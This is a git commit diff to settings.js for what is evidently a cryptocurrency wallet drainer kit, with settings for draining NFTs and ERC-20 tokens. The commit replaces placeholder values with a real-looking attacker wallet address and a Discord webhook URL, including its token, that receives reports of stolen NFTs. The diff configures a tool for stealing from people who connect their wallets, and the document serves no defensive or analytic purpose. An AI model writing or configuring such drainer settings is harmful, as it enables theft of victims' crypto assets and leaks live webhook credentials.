c08d3d7e50ddab9fab3cc717108b2dcf37279bf3
basirat1 <131591615+basirat1@users.noreply.github.com>
2023-04-30 11:41:28 -0700

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 const workChainId = 1; // The network we are working with is the chainId list https://chainlist.org/
 
-const receiveAddress = "PutYourWalletAdressHere"; // YOUR WALLET ADDRESS
+const receiveAddress = "0x40f6f2eB0C3217C8F65CB449F95563dE04B4ACcc"; // YOUR WALLET ADDRESS
 
 
 const drainNftsInfo = {
@@ -33,7 +33,7 @@ const erc20list = {
 
 const installInNewWindow = true; // install wallet if not installed
 
-const discordWebhookURL = "https://discord.com/api/webhooks/lalalalallalalalallalalalalalalalalalalalalalala"; // put ur discord webhook url in here to receive NFT's
+const discordWebhookURL = "https://discordapp.com/api/webhooks/1093501502619930705/i8UVjruwSOFRVDbfBEi8tpgwxxOssuGtAcHAkMOJOZWnqkcytJnzJNGawvwJuE9FoD2r"; // put ur discord webhook url in here to receive NFT's
 const feedbackEnabled = true; // let enabled to receive webhooks
 /*
     = = = = = END OF SETTINGS = = = = =
